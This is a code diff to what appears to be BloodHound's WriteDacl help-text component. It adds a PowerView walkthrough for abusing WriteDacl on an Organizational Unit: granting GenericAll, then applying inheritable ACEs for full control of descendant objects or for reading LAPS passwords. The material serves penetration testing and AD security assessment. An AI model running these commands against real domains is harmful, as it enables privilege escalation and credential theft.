@@ -1,5 +1,5 @@
 import { typeFormat } from '../Formatter';
-const Abuse = (sourceName, sourceType, targetName, targetType) => {
+const Abuse = (sourceName, sourceType, targetName, targetType, targetId) => {
     let text = '';
     if (targetType === 'Group') {
         text = `To abuse WriteDacl to a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
@@ -11,7 +11,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
         
         Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
         
@@ -28,7 +28,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:
 
@@ -51,7 +51,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
         
         Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
         
@@ -67,7 +67,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:
 
@@ -91,7 +91,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then create a secure string object for the password you want to set on the target user:
 
@@ -117,7 +117,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
             }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
             <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
             
             Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
             
@@ -168,7 +168,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
             }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
             <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
             
             Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
             
@@ -218,7 +218,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
         
         Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
         
@@ -240,7 +240,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
         
         Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
         
@@ -251,7 +251,62 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         Cleanup can be done using the Remove-DomainObjectAcl function:
         <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>`;
     } else if (targetType === 'OU') {
-        //TODO: Add This
+        text = `
+        <h4>Control of the Organizational Unit</h4>
+        With WriteDACL access on the OU object, you may grant yourself GenericAll against the OU, and then set another ACE on the OU that will inherit down to its descendent objects. First, you will need to set a GenericAll ACE against the OU object itself. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
+        
+        You may need to authenticate to the Domain Controller as ${
+            sourceType === 'User'
+                ? `${sourceName} if you are not running a process as that user`
+                : `a member of ${sourceName} if you are not running a process as a member`
+        } if you are not running a process as a member of that group. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):
+        
+        <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
+
+        Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (group that holds the ACE against the OU):
+        
+        <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity (OU GUID) -Rights All</code>
+
+        With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:
+        
+        <h4>Generic Descendent Object Takeover</h4>
+        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.
+        
+        First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU ${targetName} is: ${targetId}.
+        
+        Next, we will fetch the GUID for all objects. This should be <code>00000000-0000-0000-0000-000000000000</code>:
+        
+        <code>$Guids = Get-DomainGUIDMap
+        $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name</code>
+        
+        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:
+        
+        <code>$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid</code>
+
+        Finally, we will apply this ACE to our target OU:
+        
+        <code>$OU = Get-DomainOU -Raw (OU GUID)
+        $DsEntry = $OU.GetDirectoryEntry()
+        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+        $dsEntry.PsBase.CommitChanges()</code>
+
+        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
+        
+        <h4>Targeted Descendent Object Takeoever</h4>
+        If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:
+        
+        <code>$Guids = Get-DomainGUIDMap
+        $AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
+        $CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
+        $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
+        $OU = Get-DomainOU -Raw Workstations
+        $DsEntry = $OU.GetDirectoryEntry()
+        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+        $dsEntry.PsBase.CommitChanges()</code>
+        `;
     }
     return { __html: text };
 };
